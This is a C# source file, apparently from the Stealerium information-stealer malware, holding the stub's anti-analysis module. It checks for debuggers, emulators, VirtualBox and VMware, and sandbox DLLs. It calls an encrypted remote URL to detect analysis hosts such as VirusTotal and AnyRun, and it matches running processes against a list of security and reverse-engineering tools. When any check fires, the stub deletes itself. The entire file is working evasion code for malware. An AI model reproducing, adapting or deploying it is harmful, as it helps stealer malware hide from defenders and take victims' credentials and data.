using System;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using Stealerium.Stub.Helpers;

namespace Stealerium.Stub.Modules.Implant
{
    internal sealed class AntiAnalysis
    {
        // CheckRemoteDebuggerPresent (Detect debugger)
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        // GetModuleHandle (Detect SandBox)
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        /// <summary>
        /// Detects if the file is being debugged.
        /// </summary>
        public static bool Debugger()
        {
            var isDebuggerPresent = false;
            try
            {
                CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
                return isDebuggerPresent;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Detects if the file is running in an emulator.
        /// </summary>
        public static bool Emulator()
        {
            try
            {
                var ticks = DateTime.Now.Ticks;
                Thread.Sleep(10);
                if (DateTime.Now.Ticks - ticks < 10L)
                    return true;
            }
            catch
            {
                return false;
            }

            return false;
        }

        /// <summary>
        /// Detects if the system is hosted in environments like VirusTotal or AnyRun.
        /// </summary>
        public static async Task<bool> HostingAsync()
        {
            try
            {
                using (var client = new HttpClient())
                {
                    var status = await client.GetStringAsync(StringsCrypt.Decrypt(new byte[]
                    {
                        145, 244, 154, 250, 238, 89, 238, 36, 197, 152,
                        49, 235, 197, 102, 94, 163, 45, 250, 10,
                        108, 175, 221, 139, 165, 121, 24
                    })).ConfigureAwait(false);

                    return status.Contains("true");
                }
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Detects suspicious processes that are commonly used for analysis.
        /// </summary>
        public static bool Processes()
        {
            var runningProcessList = Process.GetProcesses();

            // List of common tools and processes used for reverse engineering, system analysis, and debugging
            string[] suspiciousProcesses =
            {
                // Debugging and reverse engineering tools
                "processhacker", "netstat", "netmon", "tcpview", "wireshark", "filemon", "regmon", "cain",
                "ollydbg", "ida", "ida64", "idag", "idag64", "idaw", "idaw64", "idau", "idau64", "scylla",
                "scylla_x64", "scylla_x86", "procdump", "procmon", "x64dbg", "x32dbg", "windbg", "reshacker",
        
                // Virtual machine processes
                "vmware", "vboxservice", "vboxtray", "vmsrvc", "vmusrvc",
        
                // Sandboxing tools
                "sandboxie", "sandboxiedcomlaunch", "sandboxiedcomdll", "snxhk", "avast", "cuckoo",
        
                // Antivirus and security software often used in analysis
                "avg", "avast", "avp", "kav", "sophos", "malwarebytes", "mbam", "emsisoft", "bitdefender",
                "eset", "nod32", "mcshield", "clamwin", "clamav", "f-secure", "gdata", "zonealarm", 
        
                // Monitoring and system inspection tools
                "autoruns", "autorunsc", "procexp", "procexp64", "perfmon", "sysmon", "sysinternals",
        
                // Network monitoring and inspection tools
                "fiddler", "charles", "burpsuite", "mitmproxy", "netmon", "ethereal", "tshark",
        
                // Miscellaneous tools
                "cheatengine", "de4dot", "xperf", "hxd", "dumpcap", "wireshark", "immunitydebugger", "resourcehacker"
            };

            // Check if any running process matches the suspicious processes list
            return runningProcessList.Any(process => suspiciousProcesses.Contains(process.ProcessName.ToLower()));
        }


        /// <summary>
        /// Detects if the system is running in a sandbox.
        /// </summary>
        public static bool SandBox()
        {
            string[] sandboxDlls = { "SbieDll", "SxIn", "Sf2", "snxhk", "cmdvrt32" };
            return sandboxDlls.Any(dll => GetModuleHandle(dll + ".dll") != IntPtr.Zero);
        }

        /// <summary>
        /// Detects if the system is running inside a Virtual Machine.
        /// </summary>
        public static bool VirtualBox()
        {
            try
            {
                using (var managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
                {
                    using (var managementObjectCollection = managementObjectSearcher.Get())
                    {
                        foreach (var obj in managementObjectCollection)
                        {
                            var manufacturer = obj["Manufacturer"].ToString().ToLower();
                            var model = obj["Model"].ToString().ToUpperInvariant();

                            if ((manufacturer == "microsoft corporation" && model.Contains("VIRTUAL")) ||
                                manufacturer.Contains("vmware") || model == "VIRTUALBOX")
                                return true;
                        }
                    }
                }

                foreach (var obj in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
                {
                    var name = obj.GetPropertyValue("Name").ToString();
                    if (name.Contains("VMware") || name.Contains("VBox"))
                        return true;
                }
            }
            catch
            {
                return false;
            }

            return false;
        }

        /// <summary>
        /// Runs all anti-analysis checks and self-destructs if any hostile environment is detected.
        /// </summary>
        public static async Task<bool> RunAsync()
        {
            if (Config.AntiAnalysis != "1") return false;

            if (await HostingAsync().ConfigureAwait(false))
            {
                Logging.Log("AntiAnalysis: Hosting detected! Self-destructing...");
                SelfDestruct.Melt();
                return true;
            }

            if (Processes())
            {
                Logging.Log("AntiAnalysis: Suspicious process detected! Self-destructing...");
                SelfDestruct.Melt();
                return true;
            }

            if (VirtualBox())
            {
                Logging.Log("AntiAnalysis: Virtual Machine detected! Self-destructing...");
                SelfDestruct.Melt();
                return true;
            }

            if (SandBox())
            {
                Logging.Log("AntiAnalysis: Sandbox detected! Self-destructing...");
                SelfDestruct.Melt();
                return true;
            }

            if (Debugger())
            {
                Logging.Log("AntiAnalysis: Debugger detected! Self-destructing...");
                SelfDestruct.Melt();
                return true;
            }

            return false;
        }
    }
}
